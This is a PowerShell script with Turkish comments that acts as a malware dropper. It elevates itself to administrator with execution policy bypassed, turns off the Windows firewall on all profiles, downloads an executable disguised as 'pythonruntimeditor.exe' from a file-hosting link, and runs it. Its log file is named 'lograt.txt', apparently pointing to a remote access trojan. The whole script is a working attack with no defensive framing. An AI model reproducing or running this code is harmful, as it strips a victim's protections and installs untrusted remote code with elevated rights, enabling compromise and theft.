# Yönetici yetkisi istemek
$isAdmin = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
$adminRole = [Security.Principal.WindowsBuiltInRole]::Administrator

if (-not ($isAdmin.IsInRole($adminRole))) {
    # Eğer yönetici değilse, yönetici olarak scripti başlat
    Start-Process powershell -ArgumentList "Start-Process PowerShell -ArgumentList '-NoExit', '-ExecutionPolicy Bypass', '-Command $MyInvocation.MyCommand.Path'" -Verb RunAs
    exit
}

# Firewall'ı kapatmak için fonksiyon
function Disable-Firewall {
    Write-Host "Firewall kapatılıyor..."
    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
    Write-Host "Firewall kapalı!"
}

# Dosya indir ve kontrol et
$exeUrl = "https://store10.gofile.io/download/web/f251cd75-0191-4927-9a7b-2035446b5c3d/pythonruntimeditor.exe"
$localPath = "C:\Users\dogud\Downloads\pythonruntimeditor.exe"
$logFile = "C:\Users\dogud\Downloads\lograt.txt"

# Log fonksiyonu
$log = { param($msg) Add-Content -Path $logFile -Value ("[$(Get-Date -Format 'HH:mm:ss')] $msg") }

# Dosya indir ve kontrol et
try {
    $log "İndirme işlemi başlatılıyor..."
    Invoke-WebRequest -Uri $exeUrl -OutFile $localPath -ErrorAction Stop

    # Dosya boyutunu kontrol et
    $fileSize = (Get-Item $localPath).length
    $expectedSize = 46000  # 46 KB'lik dosya için

    if ($fileSize -lt $expectedSize) {
        $log "HATA: Dosya boyutu hatalı. Boyut: $fileSize byte. Yeniden indiriyorum..."
        Remove-Item $localPath -Force
        Invoke-WebRequest -Uri $exeUrl -OutFile $localPath -ErrorAction Stop
    } else {
        $log "Dosya başarıyla indirildi. Boyut: $fileSize byte"
    }

    # Firewall kapatılıyor
    Disable-Firewall

    # Dosyayı çalıştır
    $log "Dosya çalıştırılıyor..."
    Start-Process -FilePath $localPath -WindowStyle Normal
} catch {
    $log "HATA: $($_.Exception.Message)"
}
